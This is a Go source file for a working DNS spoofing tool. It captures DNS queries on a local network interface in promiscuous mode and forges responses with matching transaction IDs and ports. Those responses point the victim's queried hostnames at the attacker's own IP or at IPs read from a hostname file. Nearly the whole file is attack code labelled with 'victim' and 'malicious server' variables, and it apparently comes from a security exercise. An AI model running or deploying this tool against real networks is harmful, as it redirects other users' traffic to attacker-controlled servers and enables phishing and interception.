package main

import (
	_ "encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	intface    string
	filename   string
	bpf_filter string

	victimIps  []string
	hostnames  []string
	attackerIP net.IP // To store IP of the attacker in the current interface
)

type DnsMsg struct {
	Timestamp       string
	SourceIP        string
	DestinationIP   string
	DnsQuery        string
	DnsAnswer       []string
	DnsAnswerTTL    []string
	NumberOfAnswers string
	DnsResponseCode string
	DnsId           string
}

var (
	devName  string
	err      error
	handle   *pcap.Handle
	InetAddr string
	SrcIP    string
	DstIP    string
	SrcPort  string
	DstPort  string
)

func main() {

	//Getting command line inputs
	_ = bpf_filter
	flag.StringVar(&intface, "i", "No interface provided", "your interface in promiscuous mode")
	flag.StringVar(&filename, "f", "no file provided", "hostnames file")
	flag.Parse()
	bpf_filter = "nil"
	argsWithoutProg := os.Args[1:]

	//if there are more than one arguments - to extract the "bpf filter"
	if len(argsWithoutProg) != 0 {
		if (os.Args[len(argsWithoutProg)-1] != "-i") && (os.Args[len(argsWithoutProg)-1] != "-f") {
			bpf_filter = os.Args[len(argsWithoutProg)]
		}
	}
	if bpf_filter == "nil" {
		bpf_filter = "udp and dst port 53"
	}
	if filename != "no file provided" {
		readHostfile()
	}
	if intface == "No interface provided" {
		findDevices()
	} else {
		findMyIp(intface)
		liveCapture()
	}

}

//Ascertaining default network interface when input is not given for the Network interface
func findDevices() {
	// Find all devices
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}

	intface = devices[0].Name
	findMyIp(intface)
	liveCapture()

}

func findMyIp(intfaceName string) {
	list, err := net.Interfaces()
	if err != nil {
		panic(err)
	}

	for _, iface := range list {
		if iface.Name == intfaceName {
			addrs, err := iface.Addrs()
			// handle err
			if err != nil {
				panic(err)
			}
			for _, addr := range addrs {
				switch v := addr.(type) {
				case *net.IPNet:
					attackerIP = v.IP
				}
				// process IP address
			}
			fmt.Printf("%s \n", attackerIP.String())
		}
	}
}

func liveCapture() {

	fmt.Print("I AM IN LIVE CAPTURE \n")
	fmt.Print("\n")

	var (
		device       string = intface
		snapshot_len int32  = 1024
		promiscuous  bool   = true
		err          error
		timeout      time.Duration = 1 * time.Second
		handle       *pcap.Handle
	)

	var victimIp string
	var maliciousIp string
	var victimPort string
	var victimDns string

	var txnId int

	var srcMac net.HardwareAddr
	var dstMac net.HardwareAddr

	_ = victimDns
	_ = victimIp
	_ = txnId
	_ = maliciousIp
	_ = srcMac
	_ = dstMac

	// Open device
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	//Setting BPF Filter

	if bpf_filter != "nil" {
		err = handle.SetBPFFilter(bpf_filter)
		if err != nil {
			fmt.Printf("---- Please enter BPF filter in accurate BPF syntax ----\n")
			log.Fatal(err)
		}
	}

	fmt.Printf("MY BPF FILTER IS: %s \n", bpf_filter)
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
		if ethernetLayer != nil {
			ethernetPacket, _ := ethernetLayer.(*layers.Ethernet)
			srcMac = ethernetPacket.SrcMAC
			dstMac = ethernetPacket.DstMAC
		}
		udpLayer := packet.Layer(layers.LayerTypeUDP)
		if udpLayer != nil {
			udp, _ := udpLayer.(*layers.UDP)
			SrcPort = udp.SrcPort.String()
			DstPort = udp.DstPort.String()
		}
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer != nil {
			ip, _ := ipLayer.(*layers.IPv4)
			SrcIP = ip.SrcIP.String()
			DstIP = ip.DstIP.String()
		}
		dnsLayer := packet.Layer(layers.LayerTypeDNS)
		if dnsLayer != nil && strings.Contains(DstPort, "53(") {
			dns, _ := dnsLayer.(*layers.DNS)
			dnsId := int(dns.ID)
			dnsResponseCode := int(dns.ResponseCode)
			dnsANCount := int(dns.ANCount)

			//Moves forward to spoof only if packet is a DNS Query packet (atttacker excluded)
			if SrcIP != attackerIP.String() {
				if !(dnsANCount == 0 && dnsResponseCode > 0) || (dnsANCount > 0) {

					var dnsQuer string
					for _, dnsQuestion := range dns.Questions {
						dnsQuer = string(dnsQuestion.Name)
					}

					/* If file is not given {
						// Code goes here to call sendPacketData functions without additional check
					} */
					if filename == "no file provided" {
						txnId = int(dnsId)
						victimIp = SrcIP
						victimPort = SrcPort
						victimDns = DstIP
						maliciousIp = attackerIP.String()
						sendPacketData(txnId, victimIp, victimPort, victimDns, dnsQuer, maliciousIp, srcMac, dstMac)
					} else {
						for i := 0; i < len(hostnames); i++ {
							if strings.Contains(hostnames[i], dnsQuer) {
								// fmt.Printf("This is DNS Question string: %s \n", dnsQuer)
								// fmt.Printf("I AM GOING TO SPOOF -- \n")
								txnId = int(dnsId)
								victimIp = SrcIP
								victimPort = SrcPort
								victimDns = DstIP
								maliciousIp = victimIps[i]
								sendPacketData(txnId, victimIp, victimPort, victimDns, dnsQuer, maliciousIp, srcMac, dstMac)
							}
						}
					}
				}
			}

		}
	}

}

func readHostfile() {
	content, err := ioutil.ReadFile(filename)
	subContent := strings.Split(string(content), "\n")
	if err != nil {
		log.Fatal(err)
	}

	for _, value := range subContent {
		temp := strings.Fields(value)
		victimIps = append(victimIps, temp[0])
		hostnames = append(hostnames, temp[1])
	}
	fmt.Printf("%v \n", victimIps)
	fmt.Printf("%v \n", hostnames)
}

func sendPacketData(tId int, vicIp string, vicPort string, vicDns string, dnsQn string, maliciousIp string, srcMac net.HardwareAddr, dstMac net.HardwareAddr) {
	fmt.Print("Spoofed packet information: \n")
	fmt.Println(" Victim ip: ", vicIp)
	fmt.Println(" Victim port: ", vicPort)
	fmt.Println(" Victim DNS: ", vicDns)
	fmt.Println(" Source MAC: ", srcMac.String())
	fmt.Println(" Dst MAC: ", dstMac.String())
	fmt.Println(" Malicious server IP: ", maliciousIp)
	fmt.Printf(" Transaction ID: %d \n", tId)
	fmt.Println(" DNS Question: ", dnsQn)
	fmt.Print("-----------------------------\n")

	handle, err = pcap.OpenLive(intface, 1024, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Create ethernet layer
	eth := layers.Ethernet{
		SrcMAC:       dstMac,
		DstMAC:       srcMac,
		EthernetType: layers.EthernetTypeIPv4,
	}

	sourceIP := net.ParseIP(vicDns)
	destinationIP := net.ParseIP(vicIp)
	// Create ip layer
	ip := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    sourceIP,
		DstIP:    destinationIP,
		Protocol: layers.IPProtocolUDP,
	}

	// Create udp layer
	destinationPort, err := strconv.Atoi(vicPort)

	udp := layers.UDP{
		SrcPort: 53,
		DstPort: layers.UDPPort(destinationPort),
	}

	udp.SetNetworkLayerForChecksum(&ip)
	qnName := []byte(dnsQn)
	qst := layers.DNSQuestion{
		Name:  qnName,
		Type:  layers.DNSTypeA,
		Class: layers.DNSClassIN,
	}
	transactionId := (uint16(tId))

	malIp := net.ParseIP(maliciousIp)

	ans := layers.DNSResourceRecord{
		Name:  qnName,
		Type:  layers.DNSTypeA,
		IP:    malIp,
		Class: layers.DNSClassIN,
		TTL:   60,
	}

	dns := layers.DNS{
		BaseLayer:    layers.BaseLayer{},
		ID:           transactionId,
		QR:           true,
		OpCode:       0,
		AA:           false,
		TC:           false,
		RD:           true,
		RA:           true,
		Z:            0,
		ResponseCode: 0,
		QDCount:      1,
		ANCount:      1,
		NSCount:      0,
		ARCount:      0,
		Questions:    []layers.DNSQuestion{qst},
		Answers:      []layers.DNSResourceRecord{ans},
	}

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	if err = gopacket.SerializeLayers(buffer, options,
		&eth,
		&ip,
		&udp,
		&dns,
	); err != nil {
		panic(err)
	}

	outgoingPacket := buffer.Bytes()
	//fmt.Print("Sending packet outwards!! ")
	if err = handle.WritePacketData(outgoingPacket); err != nil {
		panic(err)
	}
}
